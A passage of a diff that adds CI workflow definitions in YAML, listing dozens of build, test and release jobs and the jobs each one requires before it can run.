+            - archive-build-report
+      - RequiredStatusNotification:
+          requires:
+            - EngineHealthChecksWorker2Of14
+      - PublishingMessagingUserGuide:
+          requires:
+            - RequiredStatusNotification
+      - server-dependency-review-stage:
+          requires:
+            - RequiredStatusNotification
+      - resolver-smoke-tests:
+          requires:
+            - server-dependency-review-stage
+      - jobRunnerVersionBump:
+          requires:
+            - resolver-smoke-tests
+      - PurgingIntermediateFiles:
+          requires:
+            - resolver-smoke-tests
+      - PushBinaryToStagingRegistry:
+          requires:
+            - PurgingIntermediateFiles
+      - rendererErrorLogsWorker2:
+          requires:
+            - PushBinaryToStagingRegistry
+      - CompilerLogCompression
+      - copy-golden-files-from-mirror:
+          requires:
+            - CompilerLogCompression
+      - optimizing-translations:
+          requires:
+            - CompilerLogCompression
+      - store-failure-report-attempt-2:
+          requires:
+            - optimizing-translations
+      - stamp-loader-version:
+          requires:
+            - optimizing-translations
+      - framework-data-validation:
+          requires:
+            - stamp-loader-version
+      - basicImageUpdatePipeline:
+          requires:
+            - stamp-loader-version
+      - MonitorTestData:
+          requires:
+            - basicImageUpdatePipeline
+      - pre-compile-image-scan:
+          requires:
+            - basicImageUpdatePipeline
+      - post-cleanup-release-tagging:
+          requires:
+            - pre-compile-image-scan
+      - reportExporterDatabaseSchema:
+          requires:
+            - pre-compile-image-scan
+      - profiler-checksum:
+          requires:
+            - reportExporterDatabaseSchema
+  router-version-tag:
+    jobs:
+      - WaitForLinkCheckerInstances
+      - emergency-mirror-sync-pipeline:
+          requires:
+            - WaitForLinkCheckerInstances
+      - PartnerPortalDeploymentPackage:
+          requires:
+            - emergency-mirror-sync-pipeline
+      - GatherInventoryDependencyReport:
+          requires:
+            - emergency-mirror-sync-pipeline
+      - post-approval-unit-tests:
+          requires:
+            - GatherInventoryDependencyReport
+      - provision-test-environment:
+          requires:
+            - post-approval-unit-tests
+      - post-backup-task:
+          requires:
+            - post-approval-unit-tests
+      - queue-worker-debug-symbols:
+          requires:
+            - post-backup-task
+      - UnlockingProductionEnvironment:
+          requires:
+            - queue-worker-debug-symbols
+      - LicenseReport:
+          requires:
+            - queue-worker-debug-symbols
+      - ExportServiceExecutable:
+          requires:
+            - LicenseReport
+      - web-app-release-manifest:
+          requires:
+            - ExportServiceExecutable
+      - restore-front-end-layer-cache:
+          requires:
+            - ExportServiceExecutable
+      - VerifyArchive:
+          requires:
+            - restore-front-end-layer-cache
+      - complete-dependency-audit-phase:
+          requires:
+            - VerifyArchive
+      - storeDependencyTree:
+          requires:
+            - VerifyArchive
+      - prune-expired-artifacts:
+          requires:
+            - storeDependencyTree
+      - pre-restore-phase:
+          requires:
+            - prune-expired-artifacts
+      - compileSettingsLoaderAssets
+      - PreInstallVolumeRemoval:
+          requires:
+            - compileSettingsLoaderAssets
+      - post-package-upgrade-smoke-test:
+          requires:
+            - PreInstallVolumeRemoval
+      - Close:
+          requires:
+            - PreInstallVolumeRemoval
+      - PrepareTestCache:
+          requires:
+            - Close
+      - catalog-changelog-round-3:
+          requires:
+            - PrepareTestCache
+      - verifyReleaseTag:
+          requires:
+            - PrepareTestCache
+      - on-demand-test:
+          requires:
+            - verifyReleaseTag
+      - verify-stable-release:
+          requires:
+            - on-demand-test
